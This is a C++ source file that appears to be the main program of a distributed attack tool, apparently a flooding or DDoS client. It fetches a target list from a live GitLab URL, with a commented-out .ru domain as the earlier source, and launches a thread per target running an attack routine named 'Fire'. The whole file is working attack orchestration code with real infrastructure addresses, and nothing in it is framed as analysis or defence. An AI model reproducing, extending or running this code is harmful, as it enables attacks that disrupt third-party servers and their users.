#include <signal.h>

#include <iostream>
#include <thread>
#include <chrono>
#include <atomic>

#include "json.hpp"

#include "attacker.hpp"
#include "curl_wrapper.hpp"
#include "utils.hpp"

__asm__(".symver realpath,realpath@GLIBC_2.33");

extern constexpr const char *API_STRING = "/api.php";
//extern constexpr const char *APIS_LIST = "http://rockstarbloggers.ru/hosts.json";
extern constexpr const char *APIS_LIST = "https://gitlab.com/cto.endel/atack_hosts/-/raw/master/hosts.json";
#define _THREADS_COUNT 	(1)

std::atomic<bool> g_shouldStop{false};

void handle_sighup(int signum) 
{
	std::cerr << "Stoping" << std::endl;
	g_shouldStop.store(true);
}

int main(int argc, char **argv)
{
	nlohmann::json hostsData;

	auto wrapper = CURLWrapper();

	// Getting hosts list
	wrapper.SetTarget(APIS_LIST);
	while(true)
	{
		if(auto resp = wrapper.Download();
			resp->m_code >= 200 && resp->m_code < 300)
		{
			try
			{
				hostsData = nlohmann::json::parse(resp->m_data);
			}
			catch(...)
			{
				std::cerr << "Failed to parse hosts list" << std::endl;
			}
			break;
		}
		else
		{
			std::cerr << "Failed to load hosts list!" << std::endl;

			std::this_thread::sleep_for(std::chrono::milliseconds(500));

			std::cerr << "Trying again to load hosts" << std::endl;
		}
	}

	std::vector<std::string> apis;
	for(auto uri : hostsData)
	{
		apis.push_back(uri);
		std::cout << "API: " << uri << std::endl;
	}
	std::cout << "Succesfully got APIs" << std::endl;

	std::vector<std::thread> pool;

	for(size_t i = 0; i < apis.size(); i++)
	{
		pool.push_back(std::thread(Fire, apis[i], std::ref(g_shouldStop)));
	}

	for(auto &thread : pool)
	{
		if(thread.joinable())
		{
			thread.join();
		}
	}
}
